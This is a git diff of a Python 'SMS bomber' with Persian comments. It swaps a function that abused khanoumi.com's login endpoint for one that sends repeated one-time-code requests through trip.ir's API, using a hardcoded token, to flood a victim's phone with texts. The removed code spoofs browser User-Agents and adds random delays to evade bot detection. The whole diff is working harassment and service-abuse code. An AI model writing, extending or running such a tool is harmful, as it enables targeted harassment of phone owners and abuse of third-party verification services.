@@ -52,84 +52,40 @@ def check_internet():
 # ------------------------------
 # SMS Service
 # ------------------------------
-def khanoumi(phone):
+
+
+
+def trip(phone):
     import requests
-    import time
-    import random
     
     formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://accounts.khanoumi.com/api/nim/v1/account/login/init"
+    url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
     
-    payload = {"phone": formatted_phone}
-    
-    # لیست User-Agent های مختلف
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    ]
+    payload = {
+        "phoneNumber": formatted_phone,
+        "token": "VHJpcDM4NjM2MjI1NjIxNzU2MjQwMDE1Mzgx"  # توکن ثابت
+    }
     
     headers = {
-        "User-Agent": random.choice(user_agents),
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br",
         "Content-Type": "application/json",
-        "Origin": "https://accounts.khanoumi.com",
-        "Referer": "https://accounts.khanoumi.com/",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "Connection": "keep-alive",
-        "X-l": "niam",
-        "TE": "trailers"
+        "Origin": "https://www.trip.ir",
+        "Referer": "https://www.trip.ir/",
     }
     
     try:
-        # ایجاد session با مدیریت cookies
-        session = requests.Session()
-        
-        # تاخیر تصادفی برای شبیه‌سازی انسان
-        time.sleep(random.uniform(1, 3))
-        
-        # اول درخواست GET به صفحه اصلی
-        home_response = session.get("https://accounts.khanoumi.com/", 
-                                  headers=headers, 
-                                  timeout=15,
-                                  allow_redirects=True)
-        
-        print(f'{g}[+] Home Status: {home_response.status_code}{a}')
-        time.sleep(random.uniform(1, 2))
-        
-        # درخواست اصلی به API
-        response = session.post(url, 
-                              json=payload, 
-                              headers=headers, 
-                              timeout=20,
-                              allow_redirects=False)
-        
-        print(f'{g}[+] API Status: {response.status_code}{a}')
-        print(f'{g}[+] Response Length: {len(response.text)} characters{a}')
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            if response.text.strip().startswith('{'):
-                try:
-                    response_data = response.json()
-                    print(f'{g}[+] JSON Response: {response_data}{a}')
-                    return True
-                except:
-                    print(f'{r}[-] Cloudflare Blocked!{a}')
-                    return False
-            else:
-                print(f'{r}[-] Cloudflare HTML Page Returned{a}')
-                return False
+            print(f'{g}(trip) {a}Code Sent')
+            return True
         else:
-            print(f'{r}[-] HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] (trip) HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] Exception: {str(e)}{a}')
+        print(f'{r}[!] trip Exception: {e}{a}')
         return False
 
 # ------------------------------
@@ -150,7 +106,7 @@ def send_service_safe(service, phone):
 # SMS Bomber
 # ------------------------------
 def Vip(phone, Time):
-    services = [khanoumi]
+    services = [trip]
     total_services = len(services)
 
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
